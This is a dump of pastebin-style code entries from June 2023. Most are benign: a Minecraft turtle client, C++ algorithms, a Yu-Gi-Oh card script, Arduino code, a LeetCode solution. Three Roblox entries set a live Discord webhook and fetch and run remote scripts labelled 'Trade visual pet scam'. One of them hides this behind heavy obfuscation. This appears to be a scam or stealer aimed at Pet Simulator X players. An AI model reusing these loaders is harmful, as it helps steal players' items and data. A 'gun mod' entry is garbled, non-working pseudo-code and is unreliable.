id,title,username,language,date,content
NhqHP1AW,Auto Digital Miner Client,Piripe,Lua,Sunday 4th of June 2023 10:57:39 AM CDT,"rednet.CHANNEL_BROADCAST = 21456
if pocket then
    rednet.open(""back"")
else
    rednet.open(""top"")
end

local turtles = {}

-- Read cache
local file = io.open(""./cache.json"",""r"")
if file ~= nil then
    turtles = textutils.unserializeJSON(file.read(""a""), {parse_null=true,parse_empty_array=true})
    file.close()
end

local function saveCache()
    file = io.open(""./cache.json"",""w"")
    if file ~= nil then
        file.write(textutils.serializeJSON(turtles))
        file.close()
    end
end

local function draw()
    term.clear()
    term.setCursorBlink(false)
    local i = 0
    for id,coords in pairs(turtles) do

        term.setCursorPos(2,2+i*3)
        term.write(id..""."")
        term.setCursorPos(3,3+i*3)
        term.write(coords.x..""/""..coords.z)
        
        i=i+1
    end
end

draw()
while true do
    local id, message = rednet.receive(""DMTurtle"")
    turtles[id] = message
    draw()
    --print(""Turtle is at ""..message.x..""/""..message.z)
end"
fR0Fa2qE,for DB,skimono,C++,Sunday 4th of June 2023 10:25:33 AM CDT,"    int n, q, i, j, s, t;
    cin >> n >> q >> s >> t;
    vector <vector <int> > dp(q, vector <int>(n + 1, inf));
    vector <int> p(q);
    for (i = 0; i < q; i++) {
        cin >> p[i];
    }
    dp[0][s] = abs(t - p[0]);
    dp[0][t] = abs(s - p[0]);
    for (i = 0; i < q - 1; i++) {
        int mn = inf;
        for (j = 1; j <= n; j++) {
            mn = min(mn, dp[i][j] + abs(p[i + 1] - j));
        }
        dp[i + 1][p[i]] = mn;
        for (j = 1; j <= n; j++) {
            if (j != p[i]) {
                dp[i + 1][j] = dp[i][j] + abs(p[i + 1] - p[i]);
            }
        }
    }
    cout << *min_element(all(dp[q - 1])) << endl;"
G3Hw1EwH,"THE COMMANDER OF SEVEN ANGELS,METATRON",arcagamer,Lua,Sunday 4th of June 2023 10:18:31 AM CDT,"local s, id = GetID()
function s.initial_effect(c)
    --Unaffected by card effects
    local e1 = Effect.CreateEffect(c)
    e1:SetType(EFFECT_TYPE_SINGLE)
    e1:SetCode(EFFECT_IMMUNE_EFFECT)
    e1:SetProperty(EFFECT_FLAG_SINGLE_RANGE)
    e1:SetRange(LOCATION_MZONE)
    e1:SetValue(s.efilter)
    c:RegisterEffect(e1)
    --Cannot be tributed
    local e2 = Effect.CreateEffect(c)
    e2:SetType(EFFECT_TYPE_SINGLE)
    e2:SetCode(EFFECT_UNTRIBUTEABLE)
    e2:SetValue(1)
    c:RegisterEffect(e2)
    --Special Summon from hand
    local e3 = Effect.CreateEffect(c)
    e3:SetDescription(aux.Stringid(id,0))
    e3:SetCategory(CATEGORY_SPECIAL_SUMMON)
    e3:SetType(EFFECT_TYPE_QUICK_O)
    e3:SetCode(EVENT_FREE_CHAIN)
    e3:SetRange(LOCATION_HAND)
    e3:SetCountLimit(1,id)
    e3:SetCondition(s.spcon)
    e3:SetCost(s.spcost)
    e3:SetTarget(s.sptg)
    e3:SetOperation(s.spop)
    c:RegisterEffect(e3)
    --Negate activated Spell/Trap and excavate
    local e4 = Effect.CreateEffect(c)
    e4:SetDescription(aux.Stringid(id,1))
    e4:SetCategory(CATEGORY_NEGATE+CATEGORY_REMOVE)
    e4:SetType(EFFECT_TYPE_QUICK_O)
    e4:SetCode(EVENT_CHAINING)
    e4:SetRange(LOCATION_MZONE)
    e4:SetCountLimit(1,id+100)
    e4:SetCondition(s.negcon)
    e4:SetCost(s.negcost)
    e4:SetTarget(s.negtg)
    e4:SetOperation(s.negop)
    c:RegisterEffect(e4)
end
--Unaffected by card effects
function s.efilter(e,te)
    return te:GetOwner()~=e:GetOwner()
end
--Special Summon from hand
function s.spcon(e,tp,eg,ep,ev,re,r,rp)
    return Duel.IsPlayerAffectedByEffect(tp,EFFECT_CANNOT_SPECIAL_SUMMON)==0
        and Duel.IsPlayerAffectedByEffect(tp,EFFECT_CANNOT_SUMMON)==0
        and (Duel.GetCurrentPhase()>=PHASE_BATTLE_START and Duel.GetCurrentPhase()<=PHASE_END)
        and (not Duel.CheckEvent(EVENT_CHAINING) or Duel.GetChainInfo(0,CHAININFO_TRIGGERING_PLAYER)~=tp)
end
function s.spcost(e,tp,eg,ep,ev,re,r,rp,chk)
    if chk==0 then return Duel.CheckReleaseGroup(tp,Card.IsAttribute,2,nil) end
    local g = Duel.SelectReleaseGroup(tp,Card.IsAttribute,2,2,nil)
    Duel.Release(g,REASON_COST)
end
function s.sptg(e,tp,eg,ep,ev,re,r,rp,chk)
   if chk==0 then return true end
    Duel.SetOperationInfo(0,CATEGORY_SPECIAL_SUMMON,e:GetHandler(),1,0,0)
end
function s.spop(e,tp,eg,ep,ev,re,r,rp)
    local c = e:GetHandler()
    if c:IsRelateToEffect(e) and Duel.SpecialSummon(c,0,tp,tp,false,false,POS_FACEUP)~=0 then
        --Cannot be Special Summoned by other ways
        local e1 = Effect.CreateEffect(c)
        e1:SetType(EFFECT_TYPE_SINGLE)
        e1:SetCode(EFFECT_CANNOT_SPECIAL_SUMMON)
        e1:SetProperty(EFFECT_FLAG_CANNOT_DISABLE+EFFECT_FLAG_UNCOPYABLE)
        e1:SetReset(RESET_EVENT+RESETS_STANDARD+RESET_PHASE+PHASE_END)
        c:RegisterEffect(e1,true)
    end
end
--Negate activated Spell/Trap and excavate
function s.negcon(e,tp,eg,ep,ev,re,r,rp)
    return Duel.IsChainNegatable(ev) and re:IsActiveType(TYPE_SPELL+TYPE_TRAP)
end
function s.negcost(e,tp,eg,ep,ev,re,r,rp,chk)
    if chk==0 then return Duel.IsExistingMatchingCard(Card.IsAbleToRemoveAsCost,tp,LOCATION_GRAVE,0,1,nil) end
    Duel.Hint(HINT_SELECTMSG,tp,HINTMSG_REMOVE)
    local g = Duel.SelectMatchingCard(tp,Card.IsAbleToRemoveAsCost,tp,LOCATION_GRAVE,0,1,1,nil)
    Duel.Remove(g,POS_FACEUP,REASON_COST)
end
function s.negtg(e,tp,eg,ep,ev,re,r,rp,chk)
    if chk==0 then return Duel.GetFieldGroupCount(tp,LOCATION_DECK,0)>0 end
    Duel.SetOperationInfo(0,CATEGORY_NEGATE,eg,1,0,0)
    Duel.SetOperationInfo(0,CATEGORY_TOGRAVE,nil,1,tp,LOCATION_DECK)
end
function s.negop(e,tp,eg,ep,ev,re,r,rp)
    if not e:GetHandler():IsRelateToEffect(e) then return end
    Duel.NegateActivation(ev)
    local g = Duel.GetDecktopGroup(tp,1)
    if #g>0 then
        local tc = g:GetFirst()
        if tc:IsType(TYPE_MONSTER) then
            Duel.SendtoGrave(tc,REASON_EFFECT)
        else
            Duel.DisableShuffleCheck()
            Duel.SendtoDeck(tc,nil,2,REASON_EFFECT)
        end
    end
end"
sG5Mp1nH,Baseplate Checker Roblox VSB,scriptingtales,Lua,Sunday 4th of June 2023 10:16:53 AM CDT,"local Base = workspace:FindFirstChild(""Base"")

if Base then
	warn(""It already exists!"")
	
else


	--Converted with ttyyuu12345's model to script plugin v4
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k==""script"" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new(""Model"",game:GetService(""Lighting""))
	Model0 = Instance.new(""Model"")
	Part1 = Instance.new(""Part"")
	Model0.Name = ""BTExport""
	Model0.Parent = mas
	Part1.Name = ""Base""
	Part1.Parent = Model0
	Part1.CFrame = CFrame.new(0.109095223, -0.600000024, 0.994790912, 1, 0, 0, 0, 1, 0, 0, 0, 1)
	Part1.Position = Vector3.new(0.10909522324800491, -0.6000000238418579, 0.9947909116744995)
	Part1.Color = Color3.new(0.121569, 0.501961, 0.113725)
	Part1.Size = Vector3.new(700.0723876953125, 1.2000000476837158, 700.65478515625)
	Part1.Anchored = true
	Part1.BottomSurface = Enum.SurfaceType.Smooth
	Part1.BrickColor = BrickColor.new(""Forest green"")
	Part1.Material = Enum.Material.Grass
	Part1.TopSurface = Enum.SurfaceType.Smooth
	Part1.brickColor = BrickColor.new(""Forest green"")
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = workspace
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end"
2jJ79GEL,Www,Eugenehoi,Lua,Sunday 4th of June 2023 10:16:42 AM CDT,"Username = ""ItJustEugene""
WebHook = ""https://discord.com/api/webhooks/1114918573148737576/NoFqk6Mo3PtMV6Wk8NmhukEYcg42Qt-WMMNFf8RcVQhkFQRCEY4n58zqjk5IEqCwywmV""

_G.CustomScriptName = ""Trade visual pet scam""
_G.Text1 = ""Script Loaded...""
_G.Text2 = ""Waiting for Script""
_G.Text3 = ""Checking Scripts...""
_G.Text4 = ""Starting Scripts...""
loadstring(game:HttpGet(""https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua""))()"
Zu19mnGE,W,Eugenehoi,Lua,Sunday 4th of June 2023 10:13:31 AM CDT,"--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==5) then v27=v24;v28=nil;function v28(...)return {...},v12(""#"",...);end v18=6;end if (v18==1) then v21=nil;function v21(v31,v32,v33)if v33 then local v82=(v31/((5 -(1 + 2))^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-(2 -(878 -(282 + 595))))) + (620 -(555 + (1701 -(1523 + 114)))))) ;return v82-(v82%(932 -(857 + 74))) ;else local v83=2^(v32-(569 -(367 + 201))) ;return (((v31%(v83 + v83))>=v83) and (928 -(214 + 713))) or (0 + 0) ;end end v22=nil;v18=2;end if (v18==3) then v24=nil;function v24()local v34,v35,v36,v37=v1(v16,v19,v19 + 3 + 0 );v19=v19 + 4 ;return (v37 * ((104146254 -80228800) -7140238)) + (v36 * (66601 -(68 + 997))) + (v35 * (1526 -(226 + 1044))) + v34 ;end v25=nil;v18=4;end if (v18==6) then v29=nil;function v29()local v38=0 -0 ;local v39;local v40;local v41;local v42;local v43;local v44;local v45;while true do if (v38==(1271 -(945 + 326))) then local v90=0 -0 ;while true do if (v90~=(3 -2)) then else v38=1 -0 ;break;end if ((0 + 0)~=v90) then else v39=700 -(271 + 429) ;v40=nil;v90=1 -0 ;end end end if (v38==(2 + 0)) then v43=nil;v44=nil;v38=3 + 0 ;end if (v38==(1501 -(1408 + 92))) then v41=nil;v42=nil;v38=1476 -(1329 + 145) ;end if (v38~=(974 -(140 + 831))) then else v45=nil;while true do if (v39==(1850 -(1409 + 441))) then local v97=0;local v98;while true do if (v97==(718 -(15 + 703))) then v98=0 + 0 ;while true do if ((439 -(262 + 176))==v98) then v42={};v39=1;break;end if (v98~=0) then else v40={};v41={};v98=1172 -(418 + 753) ;end end break;end end end if (v39==1) then local v99=0 + 0 ;while true do if (0==v99) then v43={v40,v41,nil,v42};v44=v24();v99=1 + 0 ;end if ((1207 -(696 + 510))==v99) then v45={};v39=3 -1 ;break;end end end if (v39~=(1 + 2)) then else local v100=1322 -(1249 + 73) ;while true do if (v100~=(1262 -(1091 + 171))) then else for v114=1146 -(466 + 679) ,v24() do v41[v114-(1 + 0) ]=v29();end return v43;end end end if (v39==2) then for v102=1,v44 do local v103=0;local v104;local v105;local v106;local v107;while true do if (v103==(0 -0)) then v104=0 -0 ;v105=nil;v103=1901 -(106 + 1794) ;end if (v103~=(6 -4)) then else while true do if (v104==(0 + 0)) then v105=374 -(123 + 251) ;v106=nil;v104=4 -3 ;end if (v104~=1) then else v107=nil;while true do if (v105==0) then local v167=114 -(4 + 110) ;local v168;while true do if (v167~=0) then else v168=584 -(57 + 527) ;while true do if (v168~=(699 -(208 + 490))) then else v105=1 + 0 ;break;end if (v168~=(1427 -(41 + 1386))) then else local v178=0 + 0 ;while true do if (v178~=(1 + 0)) then else v168=837 -(660 + 176) ;break;end if (v178==(0 + 0)) then v106=v22();v107=nil;v178=203 -(14 + 188) ;end end end end break;end end end if (v105==1) then if (v106==1) then v107=v22()~=(675 -(534 + 141)) ;elseif (v106==(5 -3)) then v107=v25();elseif (v106~=(2 + 1)) then else v107=v26();end v45[v102]=v107;break;end end break;end end break;end if (v103==(167 -(122 + 44))) then v106=nil;v107=nil;v103=2;end end end v43[3]=v22();for v108=1,v24() do local v109=0;local v110;local v111;local v112;while true do if (v109~=(0 + 0)) then else v110=0 + 0 ;v111=nil;v109=1 -0 ;end if (v109~=(1 -0)) then else v112=nil;while true do if (v110~=(2 -1)) then else while true do if (v111~=0) then else v112=v22();if (v21(v112,1,1)==0) then local v172=0 + 0 ;local v173;local v174;local v175;local v176;local v177;while true do if (v172~=(2 + 0)) then else v177=nil;while true do if (v173~=0) then else v174=396 -(115 + 281) ;v175=nil;v173=2 -1 ;end if (v173~=(1 + 0)) then else local v179=0;while true do if (v179==(0 -0)) then v176=nil;v177=nil;v179=1 + 0 ;end if ((3 -2)==v179) then v173=2;break;end end end if (v173==(869 -(550 + 317))) then while true do if (v174~=(7 -5)) then else local v180=0;while true do if (v180==0) then if (v21(v176,1 -0 ,1 -0 )==1) then v177[5 -3 ]=v45[v177[2]];end if (v21(v176,287 -(134 + 151) ,1667 -(970 + 695) )~=(1 -0)) then else v177[323 -(53 + 267) ]=v45[v177[3]];end v180=1;end if (v180==(1991 -(582 + 1408))) then v174=3;break;end end end if ((3 -2)==v174) then local v181=413 -(15 + 398) ;while true do if ((1 -0)==v181) then v174=7 -5 ;break;end if (v181==(0 -0)) then local v186=0;while true do if (v186==1) then v181=1;break;end if (0~=v186) then else v177={v23(),v23(),nil,nil};if (v175==(126 -(116 + 10))) then local v192=241 -(187 + 54) ;local v193;local v194;while true do if (v192==(780 -(162 + 618))) then v193=0;v194=nil;v192=1 + 0 ;end if ((1 + 0)==v192) then while true do if (v193~=(0 + 0)) then else v194=0 -0 ;while true do if (v194~=(0 + 0)) then else v177[4 -1 ]=v23();v177[9 -5 ]=v23();break;end end break;end end break;end end elseif (v175==(1552 -(1126 + 425))) then v177[1 + 2 ]=v24();elseif (v175==(7 -5)) then v177[1639 -(1373 + 263) ]=v24() -((1123 -(118 + 1003))^(1016 -(451 + 549))) ;elseif (v175==(8 -5)) then local v197=0;local v198;local v199;local v200;while true do if (v197==1) then v200=nil;while true do if (v198==(1 + 0)) then while true do if ((0 -0)~=v199) then else v200=0 -0 ;while true do if (v200~=(0 + 0)) then else v177[980 -(553 + 424) ]=v24() -((3 -1)^(26 -10)) ;v177[4]=v23();break;end end break;end end break;end if (v198~=(1384 -(746 + 638))) then else local v203=0 + 0 ;while true do if (v203==0) then v199=0 + 0 ;v200=nil;v203=1 -0 ;end if ((342 -(218 + 123))~=v203) then else v198=1 + 0 ;break;end end end end break;end if (v197~=(0 + 0)) then else v198=0 -0 ;v199=nil;v197=1;end end end v186=1;end end end end end if (v174~=0) then else local v182=0 -0 ;while true do if (v182~=(0 -0)) then else local v187=0;while true do if (v187==(1 + 0)) then v182=1582 -(1535 + 46) ;break;end if (v187==(0 + 0)) then v175=v21(v112,2,2 + 1 );v176=v21(v112,1 + 3 ,5 + 1 );v187=1;end end end if (v182==(561 -(306 + 254))) then v174=1 + 0 ;break;end end end if (v174~=(5 -2)) then else if (v21(v176,2 + 1 ,1470 -(899 + 568) )~=(2 -1)) then else v177[1206 -(373 + 829) ]=v45[v177[735 -(476 + 255) ]];end v40[v108]=v177;break;end end break;end end break;end if ((0 + 0)~=v172) then else v173=0 -0 ;v174=nil;v172=604 -(268 + 335) ;end if (v172==1) then v175=nil;v176=nil;v172=292 -(60 + 230) ;end end end break;end end break;end if (v110==(0 -0)) then local v156=572 -(426 + 146) ;local v157;while true do if (v156~=(0 + 0)) then else v157=0;while true do if (v157==(1456 -(282 + 1174))) then v111=811 -(569 + 242) ;v112=nil;v157=2 -1 ;end if (v157~=(337 -(144 + 192))) then else v110=1 + 0 ;break;end end break;end end end end break;end end end v39=1027 -(706 + 318) ;end end break;end end end v30=nil;v18=7;end if (v18==4) then function v25()local v46=v24();local v47=v24();local v48=857 -(564 + 292) ;local v49=(v21(v47,1 + 0 ,34 -14 ) * ((2 + 0)^(14 + (1893 -(157 + 1718))))) + v46 ;local v50=v21(v47,1525 -(363 + 1141) ,1611 -(1183 + 397) );local v51=((v21(v47,97 -65 )==(1 + 0)) and  -(1 + 0 + 0)) or (1002 -((3329 -2391) + 63)) ;if (v50==(1975 -((6539 -4626) + 62))) then if (v49==(0 + (1018 -(697 + 321)))) then return v51 * (0 -0) ;else v50=(5268 -3334) -(565 + 1368) ;v48=0 -0 ;end elseif (v50==(3660 -(1565 + 48))) then return ((v49==((3518 -1857) -(1477 + 184))) and (v51 * ((1139 -(782 + 356))/(0 -0)))) or (v51 * NaN) ;end return v8(v51,v50-(2665 -1642) ) * (v48 + (v49/(((4 -2) + 0)^((446 + 698) -(975 + 117))))) ;end v26=nil;function v26(v52)local v53=0 -0 ;local v54;local v55;while true do if (2==v53) then v55={};for v91=1, #v54 do v55[v91]=v2(v1(v3(v54,v91,v91)));end v53=7 -(1902 -(260 + 1638)) ;end if (v53==((1670 -(382 + 58)) -(322 + 905))) then return v6(v55);end if (v53==(611 -(602 + (28 -19)))) then v54=nil;if  not v52 then v52=v24();if (v52==(1189 -(449 + 740))) then return """";end end v53=873 -(826 + 46) ;end if (v53==(948 -(245 + 702))) then v54=v3(v16,v19,(v19 + v52) -(3 -2) );v19=v19 + v52 ;v53=1 + 1 ;end end end v18=5;end if (v18==2) then function v22()local v56=0 + 0 ;local v57;while true do if (v56==(1 -0)) then return v57;end if (v56==(0 -(0 -0))) then v57=v1(v16,v19,v19);v19=v19 + ((104 + 1102) -(902 + 303)) ;v56=1 -0 ;end end end v23=nil;function v23()local v58=1690 -(1121 + (1131 -(334 + 228))) ;local v59;local v60;while true do if (v58==(215 -(22 + 192))) then return (v60 * (939 -(483 + 200))) + v59 ;end if ((1463 -(1404 + 59))==v58) then v59,v60=v1(v16,v19,v19 + ((16 -11) -3) );v19=v19 + (2 -0) ;v58=766 -(468 + 297) ;end end end v18=3;end if (v18==0) then v19=1;v20=nil;v16=v4(v3(v16,5),"".."",function(v61)if (v1(v61,2)==79) then local v84=0;while true do if (v84==0) then v20=v0(v3(v61,1,1));return """";end end else local v85=0;local v86;while true do if (v85==0) then v86=v2(v0(v61,16));if v20 then local v113=v5(v86,v20);v20=nil;return v113;else return v86;end break;end end end end);v18=1;end if (v18==7) then function v30(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v68=v65;local v69=v66;local v70=v67;local v71=v28;local v72=1;local v73= -1;local v74={};local v75={...};local v76=v12(""#"",...) -1 ;local v77={};local v78={};for v87=0,v76 do if (v87>=v70) then v74[v87-v70 ]=v75[v87 + 1 ];else v78[v87]=v75[v87 + 1 ];end end local v79=(v76-v70) + 1 ;local v80;local v81;while true do v80=v68[v72];v81=v80[1];if (v81<=8) then if (v81<=3) then if (v81<=1) then if (v81==0) then local v116=0;local v117;local v118;local v119;local v120;while true do if (v116==2) then for v160=v117,v73 do v120=v120 + 1 ;v78[v160]=v118[v120];end break;end if (v116==1) then v73=(v119 + v117) -1 ;v120=0;v116=2;end if (v116==0) then v117=v80[2];v118,v119=v71(v78[v117](v13(v78,v117 + 1 ,v80[3])));v116=1;end end else local v121=v80[2];local v122=v78[v80[3]];v78[v121 + 1 ]=v122;v78[v121]=v122[v80[4]];end elseif (v81>2) then v64[v80[3]]=v78[v80[2]];else v78[v80[2]]=v80[3];end elseif (v81<=5) then if (v81==4) then v78[v80[2]]=v80[3];else v64[v80[3]]=v78[v80[2]];end elseif (v81<=6) then local v134=v80[2];local v135=v78[v80[3]];v78[v134 + 1 ]=v135;v78[v134]=v135[v80[4]];elseif (v81==7) then v78[v80[2]]();else do return;end end elseif (v81<=12) then if (v81<=10) then if (v81>9) then v78[v80[2]]=v64[v80[3]];else local v141=v80[2];v78[v141]=v78[v141](v13(v78,v141 + 1 ,v73));end elseif (v81>11) then v78[v80[2]][v80[3]]=v80[4];else local v145=0;local v146;local v147;local v148;local v149;while true do if (v145==1) then v73=(v148 + v146) -1 ;v149=0;v145=2;end if (v145==0) then v146=v80[2];v147,v148=v71(v78[v146](v13(v78,v146 + 1 ,v80[3])));v145=1;end if (2==v145) then for v163=v146,v73 do local v164=0;while true do if (v164==0) then v149=v149 + 1 ;v78[v163]=v147[v149];break;end end end break;end end end elseif (v81<=14) then if (v81==13) then v78[v80[2]]=v64[v80[3]];else v78[v80[2]]();end elseif (v81<=15) then v78[v80[2]][v80[3]]=v80[4];elseif (v81>16) then do return;end else local v154=0;local v155;while true do if (v154==0) then v155=v80[2];v78[v155]=v78[v155](v13(v78,v155 + 1 ,v73));break;end end end v72=v72 + 1 ;end end;end return v30(v29(),{},v17)(...);end end end v15(""LOL!133O0003083O00557365726E616D65030C3O0049744A757374457567656E6503073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31343931383537333134383733373537362F4E6F46716B364D6F3350744D5636576B384E6D68756B45596367343251742D572O4D4E46663852635651686B465152434559346E35387A716A6B35494571437779776D5603023O005F4703103O00437573746F6D5363726970744E616D6503153O0054726164652076697375616C20706574207363616D03053O00546578743103103O00536372697074204C6F616465643O2E03053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E03053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100163O0012023O00023O0012053O00013O0012023O00043O0012053O00033O00120A3O00053O00300F3O0006000700120A3O00053O00300F3O0008000900120A3O00053O00300F3O000A000B00120A3O00053O00300F3O000C000D00120A3O00053O00300F3O000E000F00120A3O00103O00120A000100113O002001000100010012001202000300136O000100034O00095O00022O00073O000100012O00113O00017O00"",v9(),...);end"
BCieCBHA,Untitled,Eugenehoi,Lua,Sunday 4th of June 2023 09:57:15 AM CDT,"G.UserName = "" ItJustEugene ""
_G.UserName2 = ""Trade Visual Pet Scam""
_G.Webhook = ""https://discord.com/api/webhooks/1114918573148737576/NoFqk6Mo3PtMV6Wk8NmhukEYcg42Qt-WMMNFf8RcVQhkFQRCEY4n58zqjk5IEqCwywmV""

loadstring(game:HttpGet(""https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts"", true))()"
Rh3FehbU,[НРС] Колоквијум - Група 3А,MartinSRB,C++,Sunday 4th of June 2023 09:57:02 AM CDT,"#include<arduinoPlatform.h>
#include<tasks.h>
#include<interrupts.h>
#include<stdio.h>
#include<serial.h>
#include <pwm.h>
#include<data.h>
#include <ctime>

extern serial Serial;

const int pin          = 26,
          measureCount = 20;
int oldState,
    startTime,
    elapsedTime = 0,
    periodTime  = 0,
    tempSum     = 0,
    tempCnt     = 0,
    lastAvrg    = -1;

void tracking(int id, void* ptrt){
    static int first = true;
    bool error = false;
    int newState = digitalRead(pin);
    if(oldState > newState){
        elapsedTime = millis() - startTime;
    }else if(oldState < newState){
        int timeLocal   = millis();
        periodTime = timeLocal - startTime;
        startTime  = timeLocal;
        if(!first){
            Serial.print(""("");
            Serial.print(tempCnt + 1);
            Serial.print("".) "");
            Serial.print(elapsedTime);
            Serial.print(' ');
            Serial.println(periodTime);
            int temperature = map(elapsedTime, 0, 1000, 0, 45);
            if(lastAvrg != -1){
                if((temperature > (lastAvrg + (lastAvrg / 2))) ||
                    (temperature < (lastAvrg - (lastAvrg / 2)))){
                    time_t now = time(0);
                    char* date = ctime(&now);
                    Serial.print(""[ERROR] Temperature is 50% diff from last avrg ("");
                    Serial.print(temperature);
                    Serial.print("") ["");
                    Serial.print(date);
                    Serial.println(""]"");
                    error = true;
                }
            }
            if(!error){
                tempSum += temperature;
            }else{
                tempSum += lastAvrg;
            }
            if(tempCnt++ == 19){
                int avrg = tempSum / measureCount;
                tempCnt = 0;
                Serial.print(""[AVERAGE] Average temperature last 20 measurings is "");
                Serial.println(avrg);
                if(lastAvrg == avrg){
                    Serial.println(""[INFO] This average is the same as the one before."");
                }
                lastAvrg = avrg;
                tempSum = 0;
                tempCnt = 0;
            }
        }else{
            first = false;
        }
    }
    oldState = newState;
}

void setup()
{
    Serial.begin(9600);
    oldState = digitalRead(pin);
    startTime = millis();
    pwmSin(pin, 1000, 0.1);
    createTask(tracking, 1, TASK_ENABLE, NULL);
}

void loop()
{

}
"
ny5etLX8,"6/4/2023 5:51 PM - MacBookPro17,1",Ozick625,autoconf,Sunday 4th of June 2023 09:51:33 AM CDT,"Log: Initializing Lion Suite v2.5.3...
Log: Lion Suite already initialized. Aborting.
Log: <color=green>Start level 1 with 0 attempt.</color> — Lion
Log: Sending 'Start' event - EventParams (12)
{
  ""levelNum"": ""1"",
  ""levelAttempt"": 0,
  ""missionType"": ""Level"",
  ""missionName"": ""Level"",
  ""timeInApp"": 163,
  ""timestamp"": ""06/04/2023 14:51:31"",
  ""sequenceId"": 4,
  ""user_global_level"": [
    [
      1,
      ""Level""
    ]
  ],
  ""debug"": ""false"",
  ""store"": false,
  ""userTutorial"": false,
  ""additionalData"": {
    ""Level"": 1,
    ""Attempt"": 0,
    ""lslc-version"": ""2.5.3"",
    ""lsla-version"": ""2.5.7""
  }
}
Log: ground
Log: sound
Log: life
Log: team
Log: wind
Log: head
"
BQBDhrTT,RansomNote & Magazine,MuzammiL5,Java,Sunday 4th of June 2023 09:50:43 AM CDT,"class Solution {
    public boolean canConstruct(String ransomNote, String magazine) {
        int l1 = ransomNote.length();
        int l2 = magazine.length();

        if (ransomNote == null || magazine == null)
            return false;

        if (l1 > l2)
            return false;

        int[] count1 = new int[26];
        int[] count2 = new int[26];

        for (int i=0; i<l1; i++)
            count1[ransomNote.charAt(i)-'a']++;
    
        for (int i=0; i<l2; i++)
            count2[magazine.charAt(i)-'a']++;

        for (int i=0; i<26; i++) {
            if (count1[i] > count2[i])
                return false;
        }
        return true;
    }
}"
8dfHVc4N,gun mod,LockdateforGHS,GetText,Sunday 4th of June 2023 09:44:36 AM CDT,"import motonicsas
import modding libary
import subotronicsas
# These are all not available to the stks libary which contains more ""Libarys"". Also stks contains almost non-available packages

useAll();

spawn.gun(=""BigBoiGun"",()_

 ..nrk gun.damage = ""2.hit1=32.shot.head=64_,true"",
 ..spk gun.cost = ""2644448"",
 
boolean.statements +- useNative

sparks = true
gpfk = true
ogx = false

gun.looks: weburl_(""raw.githubusercontent.com/ez1dev/gunlooksmodding/main/script"")()_
  nrk gun.looks(weburl),
   
   /s.close
   
   exit
   

"
